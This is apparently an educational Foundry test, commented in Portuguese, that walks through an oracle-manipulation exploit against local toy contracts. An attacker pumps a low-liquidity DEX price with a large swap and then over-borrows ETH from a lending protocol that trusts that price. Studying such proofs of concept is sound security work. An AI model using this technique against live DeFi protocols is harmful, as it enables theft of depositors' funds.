// test/Exploit.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import "../src/TokenA.sol";
import "../src/SimpleDEX.sol";
import "../src/LendingProtocol.sol";


contract ExploitTest is Test {
    
    TokenA public tokenA;
    SimpleDEX public dex;
    LendingProtocol public protocol;

    // === Nossos Atores ===
    address public deployer;
    address public attacker = makeAddr("attacker"); // Endereço virtual para o atacante

    // A função setUp é executada antes de cada função de teste
    function setUp() public {
        // 1. Define o deployer e cria os contratos
        deployer = address(this);
        tokenA = new TokenA();
        dex = new SimpleDEX(address(tokenA));
        protocol = new LendingProtocol(address(dex));

        // 2. Funda o atacante com ETH e TokenA para que ele possa operar
        vm.deal(address(protocol), 500 ether);
        vm.deal(attacker, 100 ether); // Dá 100 ETH ao atacante
        tokenA.transfer(attacker, 100 * 1e18); // Dá 100 TokenA ao atacante

        // 3. Configura o estado inicial da DEX com baixa liquidez
        tokenA.approve(address(dex), 10 * 1e18);
        dex.addLiquidity{value: 10 ether}(10 * 1e18);
    }

    
    function testExploit_OracleManipulation() public {
        // --- LOG ESTADO INICIAL ---
        uint256 initialPrice = dex.getPrice(); // Preço de 1 TokenA em ETH
        uint256 initialAttackerEthBalance = attacker.balance;
        console.log("Preco Inicial (ETH por TokenA):", initialPrice / 1e18); // Deverá ser ~1
        console.log("Saldo ETH Inicial do Atacante:", initialAttackerEthBalance / 1e18);

        // --- PASSO 1: Atacante deposita um pouco de colateral ---
        uint256 collateralAmount = 10 * 1e18;
        
        vm.startPrank(attacker); // A partir daqui, todas as chamadas são feitas pelo atacante
        
        tokenA.approve(address(protocol), collateralAmount);
        protocol.depositCollateral(collateralAmount);

        console.log("\n[Passo 1] Atacante depositou", collateralAmount / 1e18, "TokenA como colateral.");

        // --- PASSO 2: Atacante manipula o preço do oráculo ---
        uint256 attackSwapAmount = 50 ether;
        dex.swapETHForToken{value: attackSwapAmount}(0);

        uint256 manipulatedPrice = dex.getPrice();
        console.log("\n[Passo 2] Atacante fez swap de", attackSwapAmount / 1e18, "ETH.");
        console.log("Preco Manipulado (ETH por TokenA):", manipulatedPrice / 1e18); // Deverá ser bem maior que 1!

        // --- PASSO 3: Atacante pega um empréstimo injusto ---
        // Com o preço manipulado, o protocolo agora acha que os 10 TokenA do atacante
        // valem muito mais ETH do que antes.
        // Valor do colateral (na visão do protocolo) = 10 * `manipulatedPrice`
        uint256 collateralValueInEth = (collateralAmount * manipulatedPrice) / 1e18;
        console.log("Valor do colateral (visao do protocolo):", collateralValueInEth / 1e18, "ETH");

        // O atacante agora pode pegar um empréstimo grande com base nesse valor inflacionado.
        // Vamos pegar 60% do valor do colateral.
        uint256 borrowAmount = (collateralValueInEth * 60) / 100;
        protocol.borrowETH(borrowAmount);
        
        vm.stopPrank(); // Termina a personificação do atacante

        // --- VERIFICAÇÃO FINAL ---
        uint256 finalAttackerEthBalance = attacker.balance;
        console.log("\n[Passo 3] Atacante pegou emprestado:", borrowAmount / 1e18, "ETH.");
        console.log("Saldo ETH Final do Atacante:", finalAttackerEthBalance / 1e18);

        // A asserção final: o atacante deve terminar com mais ETH do que começou,
        // mesmo depois de gastar no swap, provando que o ataque foi lucrativo.
        assertGt(finalAttackerEthBalance, initialAttackerEthBalance);
    }
}